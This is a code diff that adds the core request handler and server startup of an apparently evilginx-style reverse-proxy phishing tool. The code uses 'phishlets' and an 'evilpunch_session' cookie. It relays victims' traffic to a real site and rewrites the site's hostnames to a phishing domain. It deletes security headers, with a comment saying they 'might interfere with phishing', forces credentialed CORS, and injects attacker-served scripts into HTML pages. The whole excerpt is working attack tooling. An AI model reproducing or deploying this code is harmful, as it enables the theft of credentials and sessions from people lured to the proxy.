+                original_request_data = request_data
+                request_data = apply_reverse_filter_to_request_body(
+                    request_data, 
+                    matching_phishlet['data'], 
+                    matching_phishlet['proxy_domain']
+                )
+                if request_data != original_request_data:
+                    debug_log(f"✅ Applied reverse filter to request body", "INFO")
+                    debug_log(f"   Original size: {len(original_request_data)} bytes", "DEBUG")
+                    debug_log(f"   Modified size: {len(request_data)} bytes", "DEBUG")
+                else:
+                    debug_log(f"⏭️  No reverse filter changes needed for request body", "DEBUG")
+            
+            # Prepare request parameters
+            request_kwargs = {
+                'method': request.method,
+                'url': target_url,
+                'headers': forward_headers,
+                'data': request_data,
+                'allow_redirects': False,
+                'ssl': False,
+                'auto_decompress': True,
+            }
+            
+            # Add proxy configuration if available
+            if proxy_config and proxy_config['type'] in ['http', 'https']:
+                # For aiohttp, we need to use the proxy URL format
+                proxy_url = proxy_config['url']
+                request_kwargs['proxy'] = proxy_url
+                debug_log(f"Adding proxy to request: {proxy_url}", "DEBUG")
+                debug_log(f"Full request kwargs: {request_kwargs}", "DEBUG")
+                
+                # Also add proxy_auth if username/password are provided
+                if proxy_config.get('username') and proxy_config.get('password'):
+                    from aiohttp import BasicAuth
+                    request_kwargs['proxy_auth'] = BasicAuth(
+                        proxy_config['username'], 
+                        proxy_config['password']
+                    )
+                    debug_log(f"Added proxy authentication for user: {proxy_config['username']}", "DEBUG")
+            else:
+                debug_log("No proxy configuration available for this request", "DEBUG")
+            
+            async with session.request(**request_kwargs) as resp:
+                debug_log(f"Upstream response status: {resp.status}", "INFO")
+                if proxy_config:
+                    debug_log(f"✅ Request completed through proxy: {proxy_config['url']}", "INFO")
+                else:
+                    debug_log("✅ Request completed directly (no proxy)", "INFO")
+                # debug_log(f"Upstream response headers: {dict(resp.headers)}", "DEBUG")  # Commented out to reduce noise
+                
+                # Debug: Log static file response details
+                if is_static_file:
+                    content_type = resp.headers.get('Content-Type', 'N/A')
+                    content_length = resp.headers.get('Content-Length', 'N/A')
+                    debug_log(f"📦 STATIC FILE RESPONSE:", "INFO")
+                    debug_log(f"   Content-Type: {content_type}", "INFO")
+                    debug_log(f"   Content-Length: {content_length}", "INFO")
+                    debug_log(f"   Status: {resp.status}", "INFO")
+                    if content_length != 'N/A':
+                        try:
+                            size_kb = int(content_length) / 1024
+                            debug_log(f"   Size: {size_kb:.1f} KB", "INFO")
+                        except (ValueError, TypeError):
+                            pass
+
+                # Check if content type is text-based and should have replacements applied
+                content_type = resp.headers.get('Content-Type', '').lower()
+                should_apply_replacements = False
+                
+                # Only apply replacements for text-based content types
+                if any(text_type in content_type for text_type in [
+                    'text/html', 'text/plain', 'text/css', 'text/javascript',
+                    'application/json', 'application/javascript', 'application/xml',
+                    'text/xml', 'application/xhtml+xml', 'text/x-javascript',
+                    'application/x-javascript', 'text/ecmascript', 'application/ecmascript',
+                    'text/vbscript', 'application/x-httpd-php', 'text/php',
+                    'text/asp', 'text/asp', 'text/perl', 'text/python',
+                    'text/sql', 'text/yaml', 'text/markdown', 'text/csv',
+                    'application/x-yaml', 'application/x-csv', 'application/x-www-form-urlencoded',
+                    'text/x-asm', 'text/x-c', 'text/x-c++', 'text/x-java',
+                    'text/x-pascal', 'text/x-script', 'text/x-script.phyton',
+                    'text/x-script.rexx', 'text/x-script.tcl', 'text/x-script.tcsh',
+                    'text/x-script.zsh', 'text/x-server-parsed-html', 'text/x-setext',
+                    'text/x-sgml', 'text/x-speech', 'text/x-uuencode', 'text/x-vcalendar',
+                    'text/x-vcard', 'text/xml-external-parsed-entity'
+                ]):
+                    should_apply_replacements = True
+                    debug_log(f"✅ Content type '{content_type}' supports replacements", "DEBUG")
+                else:
+                    debug_log(f"⏭️  Content type '{content_type}' - skipping replacements (binary/non-text)", "DEBUG")
+                
+                # Patch response headers
+                patched_headers = patch_headers_in(resp.headers, incoming_host, target_host)
+                for h in ("content-length", "Content-Length", "content-encoding", "Content-Encoding"):
+                    if h in patched_headers:
+                        del patched_headers[h]
+                if "content-type" not in patched_headers and "Content-Type" not in patched_headers:
+                    patched_headers["Content-Type"] = "text/html; charset=utf-8"
+                
+                # debug_log(f"Patched response headers: {dict(patched_headers)}", "DEBUG")  # Commented out to reduce noise
+
+                # === CORS AND SECURITY HEADER PROCESSING ===
+                # Handle CORS headers before sending response to browser
+                allow_origin = patched_headers.get("Access-Control-Allow-Origin")
+                if allow_origin and allow_origin != "*":
+                    try:
+                        from urllib.parse import urlparse
+                        u = urlparse(allow_origin)
+                        if u.hostname:
+                            # Replace the host with phished domain if possible
+                            # This is a simplified version - you may need to implement replaceHostWithPhished logic
+                            if matching_phishlet and matching_phishlet.get('proxy_domain'):
+                                # For now, just use the proxy domain as the new origin
+                                new_origin = f"{u.scheme}://{matching_phishlet['proxy_domain']}"
+                                patched_headers["Access-Control-Allow-Origin"] = new_origin
+                                debug_log(f"Modified CORS origin: {allow_origin} -> {new_origin}", "DEBUG")
+                            else:
+                                debug_log(f"Could not modify CORS origin: {allow_origin} - no phishlet info", "DEBUG")
+                        else:
+                            debug_log(f"Could not parse URL from CORS header: {allow_origin}", "WARN")
+                    except Exception as e:
+                        debug_log(f"Error parsing CORS header '{allow_origin}': {e}", "WARN")
+                    
+                    # Set credentials to true for CORS requests
+                    patched_headers["Access-Control-Allow-Credentials"] = "true"
+                    debug_log("Set Access-Control-Allow-Credentials to true", "DEBUG")
+                
+                # Remove security headers that might interfere with phishing
+                security_headers_to_remove = [
+                    "Content-Security-Policy",
+                    "Content-Security-Policy-Report-Only", 
+                    "Strict-Transport-Security",
+                    "X-XSS-Protection",
+                    "X-Content-Type-Options",
+                    "X-Frame-Options",
+                ]
+                
+                for header in security_headers_to_remove:
+                    if header in patched_headers:
+                        del patched_headers[header]
+                        debug_log(f"Removed security header: {header}", "DEBUG")
+                
+                debug_log("CORS and security header processing completed", "DEBUG")
+                # === END CORS AND SECURITY HEADER PROCESSING ===
+
+                # Check if client is still connected before preparing response
+                if request.transport and request.transport.is_closing():
+                    debug_log("Client disconnected before response preparation", "WARN")
+                    return web.Response(status=499)  # Client Closed Request
+
+                stream_response = web.StreamResponse(status=resp.status, headers=patched_headers)
+                
+                # Add session cookie to response if we have session info
+                if hasattr(request, 'get') and request.get('session_cookie'):
+                    session_cookie = request['session_cookie']
+                    phishlet_id = request.get('phishlet_id')
+                    proxy_domain = request.get('proxy_domain', '')
+                    
+                    # Set cookie with appropriate attributes and phishlet-specific name
+                    cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
+                    
+                    # Set cookie domain to base domain for cross-subdomain access
+                    base_domain = proxy_domain
+                    if '.' in base_domain:
+                        # For subdomains, use the base domain
+                        base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
+                    
+                    stream_response.set_cookie(
+                        cookie_name,
+                        session_cookie,
+                        max_age=31536000,  # 1 year
+                        httponly=True,      # Prevent XSS
+                        secure=False,       # Set to False for HTTP, True for HTTPS
+                        samesite='Lax',     # CSRF protection
+                        domain=f'.{base_domain}'  # Set to base domain for cross-subdomain access
+                    )
+                    debug_log(f"Added session cookie to response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
+                
+                # Wrap prepare call in try-catch to handle race condition
+                try:
+                    await stream_response.prepare(request)
+                    debug_log("Stream response prepared", "DEBUG")
+                except Exception as prepare_error:
+                    if "Cannot write to closing transport" in str(prepare_error) or "ClientConnectionResetError" in str(prepare_error):
+                        debug_log("Client disconnected during response preparation", "WARN")
+                        return web.Response(status=499)  # Client Closed Request
+                    else:
+                        debug_log(f"Response preparation error: {prepare_error}", "ERROR")
+                        raise prepare_error
+
+                try:
+                    # CRITICAL FIX: Build replacement mapping ONLY from the current phishlet, not from all phishlets
+                    # This ensures that replacements are scoped to the specific phishlet being used
+                    
+                    if matching_phishlet:
+                        # Use ONLY the current phishlet's configuration for replacements
+                        current_phishlet_data = matching_phishlet['data'] if isinstance(matching_phishlet.get('data'), dict) else {}
+                        current_hosts_to_proxy = current_phishlet_data.get('hosts_to_proxy', [])
+                        
+                        debug_log(f"Building replacement map from current phishlet: {matching_phishlet['name']}", "DEBUG")
+                        
+                        # Build local_map from current phishlet only
+                        local_map = {}
+                        
+                        # Add subdomain mappings from current phishlet first
+                        for entry in current_hosts_to_proxy:
+                            if isinstance(entry, dict):
+                                original_host = entry.get('host', '').strip()
+                                proxy_sub = entry.get('proxy_subdomain', '').strip()
+                                
+                                if original_host and proxy_sub:
+                                    # Build the proxy hostname
+                                    proxy_host = f"{proxy_sub}.{matching_phishlet['proxy_domain']}"
+                                    local_map[original_host] = proxy_host
+                                    debug_log(f"  Subdomain mapping from current phishlet: {original_host} -> {proxy_host}", "DEBUG")
+                        
+                        # Add main target mapping LAST - this should be processed after all subdomains
+                        local_map[target_host] = incoming_host
+                        debug_log(f"  Main target mapping (added last): {target_host} -> {incoming_host}", "DEBUG")
+                        
+                        # Add mapping for string replacement from filters
+                        for filter in current_phishlet_data.get('filters', []):
+                            if filter.get('type') == 'url':
+                                if filter.get('url') == '*':
+                                    local_map[filter.get('locate')] = filter.get('replace')
+                                    debug_log(f"  String replacement mapping (global): {filter.get('locate')} -> {filter.get('replace')}", "DEBUG")
+                                else:
+                                    # Compare URL path instead of full URL object
+                                    request_path = str(request.url.path)
+                                    filter_url = filter.get('url', '')
+                                    if filter_url == request_path or filter_url in request_path:
+                                        local_map[filter.get('locate')] = filter.get('replace')
+                                        debug_log(f"  String replacement mapping (URL-specific): {filter.get('locate')} -> {filter.get('replace')} for path {request_path}", "DEBUG")
+                                    else:
+                                        debug_log(f"  Skipping string replacement for path {request_path} (filter URL: {filter_url})", "DEBUG")
+                            else:
+                                debug_log(f"  Skipping non-URL filter: {filter.get('type')}", "DEBUG")
+                        
+                        # Use only the current phishlet's mappings
+                        filtered_map = local_map
+                        
+                        debug_log(f"Using ONLY current phishlet mappings: {len(filtered_map)} entries", "DEBUG")
+                    else:
+                        # Fallback to old logic if no phishlet found (shouldn't happen in normal operation)
+                        debug_log("No matching phishlet found, using fallback replacement logic", "WARN")
+                        
+                        # Build a minimal fallback map
+                        filtered_map = {target_host: incoming_host}
+                        debug_log(f"Using fallback mapping: {target_host} -> {incoming_host}", "DEBUG")
+                    
+                    # Prepare ordered replacements: ALL sorted by descending target length to ensure specific subdomains are replaced before base domains
+                    ordered_replacements = []  # List[Tuple[str, str]]
+                    
+                    # Add ALL mappings (including target_host) to be sorted by length
+                    all_mappings = [(t, p) for t, p in filtered_map.items()]
+                    # Sort by length in descending order so longer hostnames (like tools.fluxxset.com) are processed before shorter ones (like fluxxset.com)
+                    all_mappings.sort(key=lambda kv: len(kv[0]), reverse=True)
+                    
+                    for tgt, prox in all_mappings:
+                        ordered_replacements.append((tgt, prox))
+                        if tgt == target_host:
+                            debug_log(f"  Primary replacement: {target_host} -> {prox}", "DEBUG")
+                        else:
+                            debug_log(f"  Secondary replacement: {tgt} -> {prox}", "DEBUG")
+                    
+                    # Debug: Verify the replacement order is correct
+                    debug_log(f"Final replacement order (longest first): {[(t, p) for t, p in ordered_replacements]}", "DEBUG")
+                    
+                    # Add specific debug for tools.fluxxset.com replacement
+                    debug_log(f"Looking for 'tools.fluxxset.com' in response content...", "DEBUG")
+                    
+                    # Verify the specific replacement we want is in the list
+                    tools_replacement = next((item for item in ordered_replacements if 'tools.fluxxset.com' in item[0]), None)
+                    if tools_replacement:
+                        debug_log(f"✓ Found tools.fluxxset.com replacement: {tools_replacement[0]} -> {tools_replacement[1]}", "INFO")
+                    else:
+                        debug_log(f"⚠️  WARNING: tools.fluxxset.com replacement NOT FOUND in ordered_replacements!", "WARN")
+                    
+                    debug_log("=== END REQUEST SETUP ===", "DEBUG")
+                    
+                    max_key_len = max((len(k) for k, _ in ordered_replacements), default=0)
+                    overlap = max(0, max_key_len - 1)
+                    debug_log(f"Max key length: {max_key_len}, overlap: {overlap}", "DEBUG")
+
+                    # Check if client is still connected before preparing response
+                    if request.transport and request.transport.is_closing():
+                        debug_log("Client disconnected before response preparation", "WARN")
+                        return web.Response(status=499)  # Client Closed Request
+                    
+                    # Stream with small overlap buffer so host strings across chunk boundaries are replaced
+                    tail_text: str = ""
+                    chunk_count = 0
+                    total_bytes = 0
+
+                    debug_log("Starting response streaming...", "INFO")
+                    
+                    # Debug: Log static file streaming info
+                    if is_static_file:
+                        debug_log(f"🚀 STATIC FILE STREAMING STARTED: {url_path}", "INFO")
+                        debug_log(f"   Chunk size: 4096 bytes", "INFO")
+                        debug_log(f"   Expected content replacement: {'No' if is_static_file else 'Yes'}", "INFO")
+                    
+                    async for chunk in resp.content.iter_chunked(4096):
+                        # Check if client is still connected before processing each chunk
+                        if request.transport and request.transport.is_closing():
+                            debug_log("Client disconnected during streaming", "WARN")
+                            break
+                            
+                        chunk_count += 1
+                        chunk_size = len(chunk)
+                        total_bytes += chunk_size
+                        
+                        # Attempt text decode
+                        text: str
+                        if isinstance(chunk, bytes):
+                            try:
+                                text = chunk.decode('utf-8')
+                            except UnicodeDecodeError:
+                                # Flush any pending tail before forwarding raw bytes
+                                if tail_text:
+                                    try:
+                                        await stream_response.write(tail_text.encode('utf-8'))
+                                    except Exception as write_error:
+                                        if "Cannot write to closing transport" in str(write_error):
+                                            debug_log("Client disconnected during write", "WARN")
+                                            break
+                                        else:
+                                            raise write_error
+                                    tail_text = ""
+                                
+                                try:
+                                    await stream_response.write(chunk)
+                                except Exception as write_error:
+                                    if "Cannot write to closing transport" in str(write_error):
+                                        debug_log("Client disconnected during write", "WARN")
+                                        break
+                                    else:
+                                        raise write_error
+                                continue
+                        elif isinstance(chunk, str):
+                            text = chunk
+                        else:
+                            # Unknown type; flush tail and forward
+                            if tail_text:
+                                try:
+                                    await stream_response.write(tail_text.encode('utf-8'))
+                                except Exception as write_error:
+                                    if "Cannot write to closing transport" in str(write_error):
+                                        debug_log("Client disconnected during write", "WARN")
+                                        break
+                                    else:
+                                        raise write_error
+                                tail_text = ""
+                            
+                            try:
+                                await stream_response.write(chunk)  # type: ignore[arg-type]
+                            except Exception as write_error:
+                                if "Cannot write to closing transport" in str(write_error):
+                                    debug_log("Client disconnected during write", "WARN")
+                                    break
+                                else:
+                                    raise write_error
+                            continue
+
+                        # Combine with tail and apply replacements
+                        combined = tail_text + text
+                        
+                        # Check if tools.fluxxset.com exists in this chunk before replacement
+                        if 'tools.fluxxset.com' in combined:
+                            debug_log(f"🔍 Found 'tools.fluxxset.com' in chunk {chunk_count} - will attempt replacement", "DEBUG")
+                        
+                        if ordered_replacements:
+                            # Check if content type supports replacements
+                            if not should_apply_replacements:
+                                debug_log(f"⏭️  Skipping replacements for non-text content type: {content_type}", "DEBUG")
+                            else:
+                                # CRITICAL FIX: Use regex-based replacement to avoid order interference
+                                # This ensures all replacements happen simultaneously without affecting each other
+                                
+                                import re
+                                
+                                # Step 1: Create a mapping of all replacements to apply
+                                replacement_map = {}
+                                for tgt, prox in ordered_replacements:
+                                    if tgt and prox and tgt in combined:
+                                        replacement_map[tgt] = prox
+                                
+                                # Step 2: Apply all replacements using regex to avoid interference
+                                if replacement_map:
+                                    # Sort by length (longest first) to ensure specific subdomains are processed first
+                                    sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
+                                    
+                                    debug_log(f"🔄 Applying {len(sorted_replacements)} replacements using regex for chunk {chunk_count}", "DEBUG")
+                                    
+                                    # Create a single regex pattern that matches all targets
+                                    pattern_parts = []
+                                    replacement_dict = {}
+                                    
+                                    for tgt, prox in sorted_replacements:
+                                        # Escape special regex characters and add word boundaries
+                                        escaped_target = re.escape(tgt)
+                                        pattern_parts.append(escaped_target)
+                                        replacement_dict[tgt] = prox
+                                    
+                                    # Create a single regex pattern
+                                    if pattern_parts:
+                                        pattern = '|'.join(pattern_parts)
+                                        regex = re.compile(pattern)
+                                        
+                                        # Apply all replacements in a single operation
+                                        old_combined = combined
+                                        
+                                        def replacement_function(match):
+                                            matched_text = match.group(0)
+                                            if matched_text in replacement_dict:
+                                                replacement = replacement_dict[matched_text]
+                                                debug_log(f"✓ Regex replaced '{matched_text}' with '{replacement}' in chunk {chunk_count}", "INFO")
+                                                # Special tracking for tools.fluxxset.com replacement
+                                                if 'tools.fluxxset.com' in matched_text:
+                                                    debug_log(f"🎯 SUCCESS: tools.fluxxset.com -> {replacement} replacement completed!", "INFO")
+                                                return replacement
+                                            return matched_text
+                                        
+                                        combined = regex.sub(replacement_function, combined)
+                                        
+                                        # Debug: show final result
+                                        if old_combined != combined:
+                                            debug_log(f"�� Regex replacements completed for chunk {chunk_count}", "DEBUG")
+                                        else:
+                                            debug_log(f"⚠️  No replacements were made in chunk {chunk_count}", "DEBUG")
+                                
+                                # STEP 3: Apply hardcoded mappings AFTER all regex replacements are done
+                                # These are final cleanup replacements that should happen at the very end
+                                # Only apply if content type supports replacements
+                                if should_apply_replacements:
+                                    hardcoded_replacements = {}
+                                    
+                                    # Add hardcoded mappings for specific subdomain replacements (if applicable)
+                                    if incoming_host == "xx.in":
+                                        hardcoded_replacements["login.fluxxset.com"] = "login1.xx.in"
+                                        debug_log(f"Added hardcoded mapping for final pass: login.fluxxset.com -> login1.xx.in", "DEBUG")
+                                    
+                                    # Apply hardcoded replacements if any exist
+                                    if hardcoded_replacements:
+                                        debug_log(f"🔄 Applying {len(hardcoded_replacements)} hardcoded replacements after regex", "DEBUG")
+                                        old_combined = combined
+                                        
+                                        for tgt, prox in hardcoded_replacements.items():
+                                            if tgt in combined:
+                                                combined = combined.replace(tgt, prox)
+                                                debug_log(f"✓ Final hardcoded replacement: '{tgt}' -> '{prox}' in chunk {chunk_count}", "INFO")
+                                        
+                                        if old_combined != combined:
+                                            debug_log(f"🔄 Hardcoded replacements completed for chunk {chunk_count}", "DEBUG")
+                                        else:
+                                            debug_log(f"⚠️  No hardcoded replacements were made in chunk {chunk_count}", "DEBUG")
+                                else:
+                                    debug_log(f"⏭️  Skipping hardcoded replacements for non-text content type: {content_type}", "DEBUG")
+                                
+                                # STEP 4: JavaScript injection for HTML content
+                                # Only inject JavaScript for HTML content types and when we have script endpoints
+                                if (should_apply_replacements and 
+                                    'text/html' in content_type and 
+                                    request.get('js_script_endpoints')):
+                                    
+                                    script_endpoints = request.get('js_script_endpoints', [])
+                                    if script_endpoints:
+                                        debug_log(f"🔄 Applying JavaScript injection for {len(script_endpoints)} scripts in chunk {chunk_count}", "DEBUG")
+                                        
+                                        # For streaming HTML, we need to inject script tags strategically
+                                        # Check if this chunk contains closing head tag
+                                        if '</head>' in combined:
+                                            debug_log(f"🎯 Found </head> tag in chunk {chunk_count}, injecting scripts", "INFO")
+                                            
+                                            # Inject script tags before </head>
+                                            script_tags = []
+                                            for endpoint in script_endpoints:
+                                                script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
+                                            
+                                            script_html = '\n    '.join(script_tags)
+                                            combined = combined.replace('</head>', f'    {script_html}\n</head>')
+                                            
+                                            debug_log(f"✓ Injected {len(script_endpoints)} script tags before </head>", "INFO")
+                                            
+                                            # Mark as injected to avoid duplicate injection
+                                            request['js_injection_completed'] = True
+                                        elif '</body>' in combined and not request.get('js_injection_completed'):
+                                            # Fallback: if no </head> tag but we have </body>, inject before it
+                                            debug_log(f"🎯 Found </body> tag in chunk {chunk_count}, injecting scripts (fallback)", "INFO")
+                                            
+                                            script_tags = []
+                                            for endpoint in script_endpoints:
+                                                script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
+                                            
+                                            script_html = '\n    '.join(script_tags)
+                                            combined = combined.replace('</body>', f'    {script_html}\n</body>')
+                                            
+                                            debug_log(f"✓ Injected {len(script_endpoints)} script tags before </body> (fallback)", "INFO")
+                                            request['js_injection_completed'] = True
+                                        elif '</html>' in combined and not request.get('js_injection_completed'):
+                                            # Final fallback: if no </head> or </body> tag but we have </html>, inject before it
+                                            debug_log(f"🎯 Found </html> tag in chunk {chunk_count}, injecting scripts (final fallback)", "INFO")
+                                            
+                                            script_tags = []
+                                            for endpoint in script_endpoints:
+                                                script_tags.append(f'<script src="/_temp_js/{endpoint}"></script>')
+                                            
+                                            script_html = '\n    '.join(script_tags)
+                                            combined = combined.replace('</html>', f'    {script_html}\n</html>')
+                                            
+                                            debug_log(f"✓ Injected {len(script_endpoints)} script tags before </html> (final fallback)", "INFO")
+                                            request['js_injection_completed'] = True
+                                        else:
+                                            debug_log(f"⏳ No closing tags found in chunk {chunk_count}, scripts will be injected later", "DEBUG")
+                                else:
+                                    debug_log(f"⏭️  Skipping JavaScript injection for non-HTML content type: {content_type}", "DEBUG")
+                        
+                        # Debug: Log when content replacement is skipped for static files
+                        if is_static_file and chunk_count == 1:
+                            debug_log(f"⏭️  CONTENT REPLACEMENT SKIPPED for static file: {url_path}", "DEBUG")
+                            debug_log(f"   This is expected behavior for static files", "DEBUG")
+
+                        if overlap > 0 and len(combined) > overlap:
+                            out_text = combined[:-overlap]
+                            tail_text = combined[-overlap:]
+                        else:
+                            out_text = combined
+                            tail_text = ""
+
+                        if out_text:
+                            try:
+                                await stream_response.write(out_text.encode('utf-8'))
+                            except Exception as write_error:
+                                if "Cannot write to closing transport" in str(write_error):
+                                    debug_log("Client disconnected during write", "WARN")
+                                    break
+                                else:
+                                    raise write_error
+
+                    # Flush tail at end (only if client is still connected)
+                    if tail_text and request.transport and not request.transport.is_closing():
+                        try:
+                            await stream_response.write(tail_text.encode('utf-8'))
+                            debug_log(f"Flushed tail text: {len(tail_text)} chars", "DEBUG")
+                        except Exception as write_error:
+                            if "Cannot write to closing transport" in str(write_error):
+                                debug_log("Client disconnected during tail flush", "WARN")
+                            else:
+                                raise write_error
+                    
+                    # Only write EOF if client is still connected
+                    if request.transport and not request.transport.is_closing():
+                        try:
+                            await stream_response.write_eof()
+                            debug_log(f"Response streaming complete: {chunk_count} chunks, {total_bytes} bytes", "INFO")
+                            
+                            # Debug: Log static file completion stats
+                            if is_static_file:
+                                debug_log(f"✅ STATIC FILE COMPLETED: {url_path}", "INFO")
+                                if total_bytes > 0:
+                                    size_kb = total_bytes / 1024
+                            
+                        except Exception as write_error:
+                            if "Cannot write to closing transport" in str(write_error):
+                                debug_log("Client disconnected during EOF write", "WARN")
+                            else:
+                                raise write_error
+                    else:
+                        debug_log("Client disconnected before EOF write", "WARN")
+                    
+                    return stream_response
+                    
+                except Exception as chunk_error:
+                    debug_log(f"Chunk processing error: {chunk_error}", "ERROR")
+                    debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+                    
+                    # Debug: Log if this was a static file request
+                    if is_static_file:
+                        debug_log(f"❌ STATIC FILE ERROR: {url_path}", "ERROR")
+                        debug_log(f"   Error occurred during streaming", "ERROR")
+                    
+                    # Check if it's a connection reset error
+                    if "Cannot write to closing transport" in str(chunk_error):
+                        debug_log("Client disconnected - returning early", "WARN")
+                        return web.Response(status=499)  # Client Closed Request
+                    
+                    # Try to prepare response if not already prepared
+                    if not stream_response.prepared and request.transport and not request.transport.is_closing():
+                        try:
+                            await stream_response.prepare(request)
+                        except Exception as prepare_error:
+                            if "Cannot write to closing transport" in str(prepare_error):
+                                debug_log("Client disconnected during response preparation", "WARN")
+                                return web.Response(status=499)
+                            else:
+                                raise prepare_error
+                    
+                    # Only write EOF if client is still connected
+                    if request.transport and not request.transport.is_closing():
+                        try:
+                            await stream_response.write_eof()
+                        except Exception as eof_error:
+                            if "Cannot write to closing transport" in str(eof_error):
+                                debug_log("Client disconnected during EOF write", "WARN")
+                            else:
+                                debug_log(f"EOF write error: {eof_error}", "ERROR")
+                    
+                    return stream_response
+                
+    except Exception as e:
+        debug_log(f"Proxy Error: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+        
+        # Debug: Log if this was a static file request
+        if 'is_static_file' in locals() and is_static_file:
+            debug_log(f"❌ STATIC FILE PROXY ERROR: {url_path if 'url_path' in locals() else 'Unknown'}", "ERROR")
+            debug_log(f"   Error occurred during proxy handling", "ERROR")
+        
+        return web.Response(text=f"Proxy Error: {e}", status=500)
+
+
+async def _build_ssl_context():
+    # Build routing and SSL (SNI) contexts off the event loop thread to avoid
+    # Django's SynchronousOnlyOperation in async contexts.
+    debug_log("Building SSL context...", "INFO")
+    base_ctx = await asyncio.to_thread(_refresh_routing_and_ssl)
+    if base_ctx is None:
+        debug_log("SSL not configured. Falling back to HTTP.", "WARN")
+    else:
+        debug_log("SSL context built successfully", "INFO")
+    return base_ctx
+
+
+async def _start_and_wait(stop_event: threading.Event, *, port: int) -> None:
+    global _runner, _site, _status
+    
+    debug_log("=== STARTING PROXY SERVER ===", "INFO")
+    debug_log(f"Target port: {port}", "INFO")
+    
+    ssl_context = await _build_ssl_context()
+    port_to_use = port
+    
+    if ssl_context is None and port_to_use < 1024:
+        debug_log(f"Port {port_to_use} requires elevated privileges; using {FALLBACK_HTTP_PORT} for HTTP.", "WARN")
+        port_to_use = FALLBACK_HTTP_PORT
+
+    app = web.Application()
+    # Add route for temporary JavaScript endpoints (MUST be before catch-all)
+    # Use more specific pattern to avoid conflicts
+    app.router.add_route('GET', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
+    app.router.add_route('OPTIONS', '/_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}', temp_js_handler)
+    debug_log("✅ JavaScript endpoint routes registered: GET,OPTIONS /_temp_js/{endpoint_id:[a-zA-Z0-9_-]+}", "INFO")
+    
+    # Add catch-all route for proxy handling (MUST be last)
+    app.router.add_route('*', '/{path:.*}', proxy_handler)
+    debug_log("✅ Proxy catch-all route registered: /{path:.*}", "INFO")
+    
+    debug_log("Web application created with proxy handler and JS endpoints", "DEBUG")
+
+    _runner = web.AppRunner(app)
+    await _runner.setup()
+    debug_log("App runner setup complete", "DEBUG")
+
+    async def _try_start_on(p: int) -> Tuple[bool, Optional[str]]:
+        global _site
+        try:
+            debug_log(f"Attempting to start server on port {p}...", "INFO")
+            _site = web.TCPSite(_runner, '0.0.0.0', p, ssl_context=ssl_context)
+            await _site.start()
+            debug_log(f"✓ Server started successfully on port {p}", "INFO")
+            return True, None
+        except OSError as e:
+            debug_log(f"OS Error starting on port {p}: {e}", "ERROR")
+            return False, str(e)
+        except Exception as e:
+            debug_log(f"Unexpected error starting on port {p}: {e}", "ERROR")
+            debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+            return False, str(e)
+
+    # First attempt
+    debug_log(f"First attempt to start on port {port_to_use}", "INFO")
+    ok, err = await _try_start_on(port_to_use)
+    if not ok:
+        debug_log(f"First attempt failed: {err}", "WARN")
+        
+        # If address in use, attempt to free 443 specifically (darwin/linux) and retry once
+        def _is_addr_in_use(message: str) -> bool:
+            lower = (message or "").lower()
+            return (
+                "address already in use" in lower
+                or "errno 48" in lower  # macOS EADDRINUSE
+                or "errno 98" in lower  # Linux EADDRINUSE
+            )
+
+        if _is_addr_in_use(err or "") and port_to_use == 443:
+            debug_log("Port 443 is busy. Attempting to free it...", "INFO")
+            try:
+                # macOS/Linux: use lsof to find PIDs listening on 443
+                res = subprocess.run([
+                    "lsof", "-ti", f"tcp:{port_to_use}"
+                ], capture_output=True, text=True, check=False)
+                pids = [int(x) for x in res.stdout.strip().splitlines() if x.strip().isdigit()]
+                if pids:
+                    debug_log(f"Found PIDs listening on 443: {pids}", "INFO")
+                    # Try graceful term first
+                    for pid in pids:
+                        try:
+                            debug_log(f"Sending SIGTERM to PID {pid}", "DEBUG")
+                            os.kill(pid, 15)  # SIGTERM
+                        except Exception as e:
+                            debug_log(f"Failed to send SIGTERM to PID {pid}: {e}", "WARN")
+                    time.sleep(1.0)
+                    # Check again
+                    res2 = subprocess.run([
+                        "lsof", "-ti", f"tcp:{port_to_use}"
+                    ], capture_output=True, text=True, check=False)
+                    remaining = [int(x) for x in res2.stdout.strip().splitlines() if x.strip().isdigit()]
+                    if remaining:
+                        debug_log(f"Some PIDs still listening: {remaining}, forcing kill", "WARN")
+                        for pid in remaining:
+                            try:
+                                debug_log(f"Sending SIGKILL to PID {pid}", "DEBUG")
+                                os.kill(pid, 9)  # SIGKILL
+                            except Exception as e:
+                                debug_log(f"Failed to send SIGKILL to PID {pid}: {e}", "WARN")
+                        time.sleep(0.5)
+                else:
+                    debug_log("No PIDs found to kill on 443.", "INFO")
+            except FileNotFoundError:
+                debug_log("'lsof' not available. Cannot free port 443 automatically.", "WARN")
+            except Exception as e:
+                debug_log(f"Failed to free port 443: {e}", "ERROR")
+                debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+            # Retry once
+            debug_log("Retrying after port cleanup...", "INFO")
+            ok, err = await _try_start_on(port_to_use)
+
+    if not ok:
+        debug_log(f"Could not bind on {port_to_use} ({err}). Falling back to {FALLBACK_HTTP_PORT}.", "WARN")
+        port_to_use = FALLBACK_HTTP_PORT
+        ok, err = await _try_start_on(port_to_use)
+        if not ok:
+            debug_log(f"Fallback port also failed: {err}", "ERROR")
+            _status.update({"running": False, "port": None, "scheme": None, "error": err})
+            raise RuntimeError(f"Failed to start proxy on fallback port {FALLBACK_HTTP_PORT}: {err}")
+
+    scheme = 'HTTPS' if ssl_context else 'HTTP'
+    debug_log(f"================================================", "INFO")
+    debug_log(f"✓ {scheme} proxy running on 0.0.0.0:{port_to_use}", "INFO")
+    debug_log(f"================================================", "INFO")
+    _status.update({"running": True, "port": port_to_use, "scheme": scheme, "error": None})
+
+    # Wait until stop_event is set in a thread executor
+    try:
+        loop = asyncio.get_running_loop()
+        debug_log("Waiting for stop signal...", "INFO")
+        await loop.run_in_executor(None, stop_event.wait)
+        debug_log("Stop signal received", "INFO")
+    finally:
+        try:
+            debug_log("Cleaning up server...", "INFO")
+            await _runner.cleanup()
+            debug_log("Server cleanup complete", "INFO")
